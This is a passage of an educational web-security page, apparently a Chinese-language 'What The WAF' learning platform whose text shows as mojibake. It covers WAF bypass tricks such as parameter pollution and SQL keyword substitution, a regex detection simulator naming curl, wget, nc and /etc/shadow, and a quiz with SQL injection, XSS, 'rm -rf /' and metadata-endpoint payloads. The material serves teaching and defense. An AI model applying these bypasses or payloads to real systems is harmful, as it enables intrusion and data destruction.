<span class="code-danger">|| (ç®¡é“ç¬¦)</span>

<span class="code-comment"># ç©ºæ ¼æ›¿ä»£</span>
<span class="code-danger">UNION+SELECT</span>

<span class="code-comment"># å‡½æ•¸æ›¿ä»£</span>
<span class="code-danger">CHAR(39) ä»£æ›¿ '</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>è¦å‰‡æ¶µè“‹å„ç¨®åŒç¾©è¡¨é”
                    </p>
                </div>

                <div class="card">
                    <h3>ğŸ“¦ åƒæ•¸æ±¡æŸ“</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># HPP (HTTP Parameter Pollution)</span>
<span class="code-danger">?id=1&id=UNION&id=SELECT</span>

<span class="code-comment"># ä¸åŒæœå‹™å™¨è™•ç†æ–¹å¼</span>
Apache: å–æœ€å¾Œä¸€å€‹
IIS: åˆä½µæ‰€æœ‰
Tomcat: å–ç¬¬ä¸€å€‹
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>æª¢æ¸¬æ‰€æœ‰é‡è¤‡åƒæ•¸
                    </p>
                </div>
            </div>
        </section>

        <!-- Interactive Quiz Section -->
        <section id="quiz">
            <h2>å¯¦æˆ°ç·´ç¿’</h2>

            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="quiz-progress" style="width: 0%"></div>
                </div>
                <div class="progress-text">
                    <span>é€²åº¦</span>
                    <span id="quiz-score">0 / 5</span>
                </div>
            </div>

            <div class="quiz-container">
                <div id="quiz-content">
                    <!-- Quiz questions will be loaded here -->
                </div>
                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
                    <button class="btn btn-secondary" id="prev-btn" onclick="prevQuestion()" disabled>ä¸Šä¸€é¡Œ</button>
                    <button class="btn btn-primary" id="next-btn" onclick="nextQuestion()">ä¸‹ä¸€é¡Œ</button>
                </div>
            </div>
        </section>

        <!-- Best Practices -->
        <section id="best-practices">
            <h2>WAF æœ€ä½³å¯¦è¸</h2>

            <div class="card-grid">
                <div class="card">
                    <h3>âœ… åˆ†å±¤é˜²ç¦¦</h3>
                    <p>WAF åªæ˜¯é˜²ç·šä¹‹ä¸€ï¼Œæ‡‰çµåˆè¼¸å…¥é©—è­‰ã€åƒæ•¸åŒ–æŸ¥è©¢ã€CSP ç­‰å¤šå±¤é˜²è­·ã€‚</p>
                </div>
                <div class="card">
                    <h3>ğŸ“Š ç›£æ§èˆ‡æ—¥èªŒ</h3>
                    <p>æŒçºŒç›£æ§ WAF æ—¥èªŒï¼Œåˆ†ææ”»æ“Šæ¨¡å¼ï¼Œä¸¦èª¿æ•´è¦å‰‡ä»¥æ¸›å°‘èª¤å ±ã€‚</p>
                </div>
                <div class="card">
                    <h3>ğŸ”„ å®šæœŸæ›´æ–°</h3>
                    <p>ä¿æŒ WAF è¦å‰‡é›†æ›´æ–°ï¼Œä»¥æ‡‰å°æ–°å‹æ”»æ“ŠæŠ€è¡“ã€‚</p>
                </div>
                <div class="card">
                    <h3>ğŸ§ª æ¸¬è©¦é©—è­‰</h3>
                    <p>åœ¨éƒ¨ç½²å‰é€²è¡Œå……åˆ†æ¸¬è©¦ï¼Œç¢ºä¿è¦å‰‡ä¸æœƒå½±éŸ¿æ­£å¸¸æ¥­å‹™æµé‡ã€‚</p>
                </div>
                <div class="card">
                    <h3>âš–ï¸ å¹³è¡¡å®‰å…¨èˆ‡å¯ç”¨æ€§</h3>
                    <p>è¦å‰‡éæ–¼åš´æ ¼æœƒå°è‡´èª¤å ±ï¼Œéæ–¼å¯¬é¬†å‰‡ç„¡æ³•æœ‰æ•ˆé˜²è­·ï¼Œéœ€æ‰¾åˆ°å¹³è¡¡é»ã€‚</p>
                </div>
                <div class="card">
                    <h3>ğŸ¯ è‡ªè¨‚è¦å‰‡</h3>
                    <p>æ ¹æ“šæ‡‰ç”¨ç¨‹å¼ç‰¹æ€§ï¼Œè‡ªè¨‚å°ˆå±¬è¦å‰‡ä»¥æä¾›æ›´ç²¾æº–çš„ä¿è­·ã€‚</p>
                </div>
            </div>
        </section>

        <!-- Resources -->
        <section id="resources">
            <h2>å»¶ä¼¸è³‡æº</h2>
            <div class="card">
                <h3>ğŸ“š æ¨è–¦å­¸ç¿’è³‡æº</h3>
                <ul style="color: var(--text-secondary); margin-top: 1rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" style="color: var(--primary);">OWASP Web Security Testing Guide</a></li>
                    <li style="margin-bottom: 0.5rem;"><a href="https://owasp.org/www-project-modsecurity-core-rule-set/" target="_blank" style="color: var(--primary);">OWASP ModSecurity Core Rule Set</a></li>
                    <li style="margin-bottom: 0.5rem;"><a href="https://portswigger.net/web-security" target="_blank" style="color: var(--primary);">PortSwigger Web Security Academy</a></li>
                    <li style="margin-bottom: 0.5rem;"><a href="https://github.com/payloadbox" target="_blank" style="color: var(--primary);">PayloadBox - Payload æ”¶é›†</a></li>
                </ul>
            </div>
        </section>
    </div>

    <!-- Footer -->
    <footer>
        <p>What The WAF - WAF å­¸ç¿’å¹³å°</p>
        <p style="margin-top: 0.5rem;">åƒ…ä¾›æ•™è‚²å­¸ç¿’ç”¨é€”ï¼Œè«‹å‹¿ç”¨æ–¼éæ³•æ´»å‹•</p>
    </footer>

    <script>
        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.dataset.tab;

                // Update tab buttons
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                // Update tab content
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.getElementById(tabId).classList.add('active');
            });
        });

        // Accordion
        function toggleAccordion(header) {
            const accordion = header.parentElement;
            accordion.classList.toggle('active');
        }

        // WAF Detection Simulator
        const wafRules = [
            { pattern: /('|"|;|--|#|\/\*|\*\/)/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ° SQL ç‰¹æ®Šå­—ç¬¦' },
            { pattern: /(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+table|update\s+.*\s+set)/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ° SQL é—œéµå­—çµ„åˆ' },
            { pattern: /(or|and)\s+[\d\w]+\s*=\s*[\d\w]+/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ°é‚è¼¯ç¹éå˜—è©¦' },
            { pattern: /(<script|javascript:|on\w+\s*=|<iframe|<img\s+[^>]*onerror)/i, type: 'XSS', desc: 'åµæ¸¬åˆ° XSS æ”»æ“Šæ¨¡å¼' },
            { pattern: /<svg[^>]*onload/i, type: 'XSS', desc: 'åµæ¸¬åˆ° SVG XSS æ”»æ“Š' },
            { pattern: /(;|\||&&|\$\(|`)\s*(ls|cat|whoami|id|pwd|wget|curl|bash|sh|nc|netcat)/i, type: 'Command Injection', desc: 'åµæ¸¬åˆ°å‘½ä»¤æ³¨å…¥' },
            { pattern: /(\.\.|%2e%2e|%252e%252e)/i, type: 'Path Traversal', desc: 'åµæ¸¬åˆ°è·¯å¾‘ç©¿è¶Š' },
            { pattern: /(\/etc\/passwd|\/etc\/shadow|\/windows\/system32)/i, type: 'Path Traversal', desc: 'åµæ¸¬åˆ°æ•æ„Ÿæª”æ¡ˆå­˜å–' },
            { pattern: /(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0)/i, type: 'SSRF', desc: 'åµæ¸¬åˆ°å…§éƒ¨ä½å€å­˜å–' },
        ];

        function checkWAF() {
            const input = document.getElementById('waf-input').value;
            const resultDiv = document.getElementById('waf-result');

            if (!input.trim()) {
                resultDiv.innerHTML = '';
                return;
            }

            let detections = [];

            for (const rule of wafRules) {
                if (rule.pattern.test(input)) {
                    detections.push(rule);
                }
            }

            if (detections.length > 0) {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-blocked">
                        <strong style="color: var(--danger);">ğŸš« è«‹æ±‚è¢«é˜»æ“‹</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary);">åµæ¸¬åˆ°ä»¥ä¸‹å¨è„…ï¼š</p>
                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
                            ${detections.map(d => `<li style="color: var(--danger);">${d.type}: ${d.desc}</li>`).join('')}
                        </ul>
                    </div>
                `;
            } else {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-allowed">
                        <strong style="color: var(--secondary);">âœ… è«‹æ±‚é€šé</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary);">æœªåµæ¸¬åˆ°å·²çŸ¥æ”»æ“Šæ¨¡å¼</p>
                    </div>
                `;
            }
        }

        function setPayload(payload) {
            document.getElementById('waf-input').value = payload;
            checkWAF();
        }

        // Quiz System
        const quizQuestions = [
            {
                question: 'ä»¥ä¸‹å“ªå€‹æ˜¯ SQL Injection æ”»æ“Š?',
                code: null,
                options: [
                    "SELECT * FROM users WHERE id=1",
                    "' OR '1'='1",
                    "<script>alert(1)</script>",
                    "../../../etc/passwd"
                ],
                correct: 1,
                explanation: "' OR '1'='1 æ˜¯å…¸å‹çš„ SQL æ³¨å…¥ payloadï¼Œç”¨æ–¼ç¹éèªè­‰ã€‚"
            },
            {
                question: 'ä»¥ä¸‹å“ªå€‹ payload å˜—è©¦é€²è¡Œ XSS æ”»æ“Š?',
                code: null,
                options: [
                    "UNION SELECT password FROM users",
                    "; rm -rf /",
                    "<img src=x onerror=alert(1)>",
                    "http://169.254.169.254/"
                ],
                correct: 2,
                explanation: "<img src=x onerror=alert(1)> åˆ©ç”¨åœ–ç‰‡è¼‰å…¥å¤±æ•—æ™‚è§¸ç™¼ JavaScriptï¼Œæ˜¯å¸¸è¦‹çš„ XSS æ”»æ“Šã€‚"
            },
            {
                question: 'ModSecurity è¦å‰‡ä¸­ï¼Œå“ªå€‹éšæ®µç”¨æ–¼æª¢æŸ¥è«‹æ±‚ä¸»é«” (Request Body)?',
                code: null,
                options: [
                    "phase:1",
                    "phase:2",
                    "phase:3",
                    "phase:4"
                ],
                correct: 1,
                explanation: "phase:2 æ˜¯è«‹æ±‚ä¸»é«”éšæ®µï¼Œç”¨æ–¼æª¢æŸ¥ POST è³‡æ–™ç­‰è«‹æ±‚å…§å®¹ã€‚"
            },
            {
                question: 'ä»¥ä¸‹å“ªç¨®æŠ€è¡“ä¸æ˜¯ WAF ç¹éæ–¹æ³•?',
                code: null,
                options: [
                    "å¤§å°å¯«è®Šæ› (Case Variation)",
                    "URL ç·¨ç¢¼ (URL Encoding)",
                    "åƒæ•¸åŒ–æŸ¥è©¢ (Parameterized Queries)",
                    "è¨»è§£æ’å…¥ (Comment Injection)"
                ],
                correct: 2,
                explanation: "åƒæ•¸åŒ–æŸ¥è©¢æ˜¯é˜²ç¦¦ SQL Injection çš„æ–¹æ³•ï¼Œä¸æ˜¯ç¹é WAF çš„æŠ€è¡“ã€‚"
            },
            {
                question: 'åµæ¸¬åˆ° http://169.254.169.254/latest/meta-data/ é€™å€‹è«‹æ±‚ï¼Œæœ€å¯èƒ½æ˜¯ä»€éº¼é¡å‹çš„æ”»æ“Š?',
                code: null,
                options: [
                    "SQL Injection",
                    "XSS",
                    "SSRF (Server-Side Request Forgery)",
                    "Path Traversal"
                ],
                correct: 2,
                explanation: "169.254.169.254 æ˜¯ AWS EC2 ç­‰é›²ç«¯æœå‹™çš„ metadata endpointï¼Œæ”»æ“Šè€…é€é SSRF å˜—è©¦å­˜å–é›²ç«¯å¯¦ä¾‹çš„æ•æ„Ÿè³‡è¨Šã€‚"
            }
        ];

        let currentQuestion = 0;
        let answers = new Array(quizQuestions.length).fill(null);

        function loadQuestion() {
            const question = quizQuestions[currentQuestion];
            const content = document.getElementById('quiz-content');

            let optionsHtml = question.options.map((option, index) => {
                let className = 'quiz-option';
                if (answers[currentQuestion] !== null) {
                    if (index === question.correct) {
                        className += ' correct';
                    } else if (index === answers[currentQuestion] && answers[currentQuestion] !== question.correct) {
                        className += ' incorrect';
                    }
                }
                return `<div class="${className}" onclick="selectAnswer(${index})">${option}</div>`;
            }).join('');

            let explanationHtml = '';
            if (answers[currentQuestion] !== null) {
                explanationHtml = `
                    <div class="result-box show ${answers[currentQuestion] === question.correct ? 'result-success' : 'result-error'}">
                        ${answers[currentQuestion] === question.correct ? 'âœ… æ­£ç¢ºï¼' : 'âŒ éŒ¯èª¤ï¼'}
                        ${question.explanation}
                    </div>
                `;
            }

            content.innerHTML = `
                <div class="quiz-question">
                    <h4>å•é¡Œ ${currentQuestion + 1} / ${quizQuestions.length}</h4>
                    <p style="margin-top: 0.5rem; margin-bottom: 1rem; font-size: 1.1rem;">${question.question}</p>
                    ${question.code ? `<div class="code-block"><code>${question.code}</code></div>` : ''}
                    <div class="quiz-options">
                        ${optionsHtml}
                    </div>
                    ${explanationHtml}
                </div>
            `;

            // Update navigation buttons
            document.getElementById('prev-btn').disabled = currentQuestion === 0;
            document.getElementById('next-btn').textContent =
                currentQuestion === quizQuestions.length - 1 ? 'å®Œæˆ' : 'ä¸‹ä¸€é¡Œ';

            updateProgress();
        }

        function selectAnswer(index) {
            if (answers[currentQuestion] !== null) return; // Already answered

            answers[currentQuestion] = index;
            loadQuestion();
        }

        function nextQuestion() {
            if (currentQuestion < quizQuestions.length - 1) {
                currentQuestion++;
                loadQuestion();
            } else {
                showResults();
            }
        }

        function prevQuestion() {
            if (currentQuestion > 0) {
                currentQuestion--;
                loadQuestion();
            }
        }

        function updateProgress() {
            const answered = answers.filter(a => a !== null).length;
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;

            document.getElementById('quiz-progress').style.width =
                `${(answered / quizQuestions.length) * 100}%`;
            document.getElementById('quiz-score').textContent =
                `${correct} / ${quizQuestions.length}`;
        }

        function showResults() {
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;
            const total = quizQuestions.length;
            const percentage = Math.round((correct / total) * 100);

            let message = '';
            if (percentage >= 80) {
                message = 'ğŸ‰ å¤ªæ£’äº†ï¼ä½ å° WAF æœ‰å¾ˆå¥½çš„ç†è§£ï¼';
            } else if (percentage >= 60) {
                message = 'ğŸ‘ ä¸éŒ¯ï¼ç¹¼çºŒå­¸ç¿’å¯ä»¥æ›´ä¸Šä¸€å±¤æ¨“ï¼';
            } else {
                message = 'ğŸ“š å»ºè­°å†è¤‡ç¿’ä¸€ä¸‹ä¸Šé¢çš„å…§å®¹ï¼';
            }

            document.getElementById('quiz-content').innerHTML = `
                <div style="text-align: center; padding: 2rem;">
                    <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">æ¸¬é©—å®Œæˆï¼</h3>
                    <p style="font-size: 3rem; margin-bottom: 1rem;">${percentage}%</p>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        ä½ ç­”å°äº† ${correct} / ${total} é¡Œ
                    </p>
                    <p style="font-size: 1.1rem;">${message}</p>
                    <button class="btn btn-primary" onclick="resetQuiz()" style="margin-top: 1.5rem;">
                        é‡æ–°æ¸¬é©—
                    </button>
                </div>
            `;
        }

        function resetQuiz() {
            currentQuestion = 0;
            answers = new Array(quizQuestions.length).fill(null);
            loadQuestion();
        }

        // Smooth scroll
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize quiz
        loadQuestion();

        // Add scroll animation
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('animate-in');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.card, .accordion, .rule-demo, .quiz-container').forEach(el => {
            observer.observe(el);
        });
    </script>
</body>
</html>
